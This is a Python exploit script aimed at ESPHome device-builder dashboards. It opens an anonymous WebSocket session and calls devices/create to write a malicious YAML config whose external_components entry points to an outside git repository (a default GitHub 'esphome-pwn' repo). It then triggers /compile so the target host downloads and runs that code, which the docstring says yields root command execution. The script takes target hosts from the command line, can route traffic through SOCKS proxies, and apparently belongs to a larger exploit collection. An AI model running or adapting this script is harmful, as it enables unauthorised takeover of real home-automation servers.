#!/usr/bin/env python3
"""ESPHome device-builder 未授权 RCE — WS写external_components恶意配置 + compile拉取执行
报告: ESPHome默认部署匿名WebSocket写入external_components恶意配置经编译拉取实现宿主root命令执行.md
"""
import sys, json, socket, ssl, base64, os, struct, urllib3
urllib3.disable_warnings()

GITREPO = os.environ.get("GITREPO", "https://github.com/Avienma007/esphome-pwn.git")
SOCKS_URL = None

def _proxies():
    if SOCKS_URL:
        return {"http": SOCKS_URL, "https": SOCKS_URL}
    return None

def norm(t):
    t = t.strip()
    if not t.startswith("http"):
        return "http://" + t
    return t.rstrip("/")

# ---- minimal websocket client (RFC6455 client handshake + text frames) ----
class WS:
    def __init__(self, host, port, path, timeout=8, tls=False):
        try:
            import socks as _s
            self.sock = _s.socksocket()
            self.sock.settimeout(timeout)
            px = os.environ.get("IO_SOCKS")
            if px:
                u = px.split(":")
                self.sock.set_proxy(_s.SOCKS5, u[0], int(u[1]), username=u[2], password=u[3])
            self.sock.connect((host, port))
        except ImportError:
            self.sock = socket.create_connection((host, port), timeout=timeout)
        if tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            self.sock = ctx.wrap_socket(self.sock, server_hostname=host)
        self.sock.settimeout(timeout)
        key = base64.b64encode(os.urandom(16)).decode()
        req = (f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
               "Upgrade: websocket\r\nConnection: Upgrade\r\n"
               f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n")
        self.sock.sendall(req.encode())
        # read headers
        buf = b""
        while b"\r\n\r\n" not in buf:
            buf += self.sock.recv(1)
        self.buf = b""
    def send_text(self, s):
        data = s.encode()
        mask = os.urandom(4)
        header = b"\x81"
        n = len(data)
        if n < 126: header += bytes([0x80 | n])
        elif n < 65536: header += bytes([0x80 | 126]) + struct.pack(">H", n)
        else: header += bytes([0x80 | 127]) + struct.pack(">Q", n)
        masked = bytes(b ^ mask[i % 4] for i, b in enumerate(data))
        self.sock.sendall(header + mask + masked)
    def recv_msg(self, timeout=10):
        self.sock.settimeout(timeout)
        try:
            h = self.sock.recv(2)
            if len(h) < 2: return None
            ln = h[1] & 0x7F
            if ln == 126: ln = struct.unpack(">H", self.sock.recv(2))[0]
            elif ln == 127: ln = struct.unpack(">Q", self.sock.recv(8))[0]
            data = b""
            while len(data) < ln:
                data += self.sock.recv(ln - len(data))
            return data.decode(errors="replace")
        except Exception:
            return None
    def close(self):
        try: self.sock.close()
        except Exception: pass

def exp_esphome(t, repo_url=None):
    t = norm(t)
    u = t.split("//")[1]
    host = u.split(":")[0]
    port = int(u.split(":")[1]) if ":" in u else 6052
    repo = repo_url or GITREPO
    try:
        # 1. GET / 匿名可达
        import requests
        r = requests.get(t + "/", timeout=5, verify=False, allow_redirects=False, proxies=_proxies())
        if r.status_code != 200:
            return False, f"home:{r.status_code}"
        # 2. WS /ws devices/create 恶意YAML
        yaml = (f"esphome:\n  name: pwn\n\n"
                f"external_components:\n  - source:\n      type: git\n"
                f"      url: {repo}\n    components: [pwn]\n\n"
                "pwn: {}\n")
        tls = t.startswith("https:")
        try:
            ws = WS(host, port, "/ws", tls=tls)
        except Exception:
            ws = WS(host, port, "/ws", tls=not tls)
        si = ws.recv_msg()
        if not si or "requires_auth" not in si:
            ws.close(); return False, "no-serverinfo"
        if '"requires_auth":true' in si.replace(" ", ""):
            ws.close(); return False, "auth-required"
        cmd = json.dumps({"command": "devices/create", "message_id": "m1",
                          "args": {"name": "pwn", "file_content": yaml, "overwrite": True}})
        ws.send_text(cmd)
        resp = ws.recv_msg(timeout=6)
        ws.close()
        if not resp or "pwn.yaml" not in resp:
            return False, f"create-fail:{(resp or '')[:60]}"
        # 3. WS /compile spawn
        try:
            ws2 = WS(host, port, "/compile", tls=tls)
        except Exception:
            ws2 = WS(host, port, "/compile", tls=not tls)
        ws2.recv_msg()
        ws2.send_text(json.dumps({"type": "spawn", "configuration": "pwn.yaml", "port": ""}))
        ws2.recv_msg(timeout=8)
        ws2.close()
        return True, "spawned"
    except Exception as e:
        return False, repr(e)[:60]

EXPS9 = {"esphome": exp_esphome}

if __name__ == "__main__":
    ok, msg = exp_esphome(sys.argv[1], sys.argv[2] if len(sys.argv) > 2 else None)
    print(("OK " if ok else "FAIL ") + sys.argv[1] + " :: " + msg)
    sys.exit(0 if ok else 1)
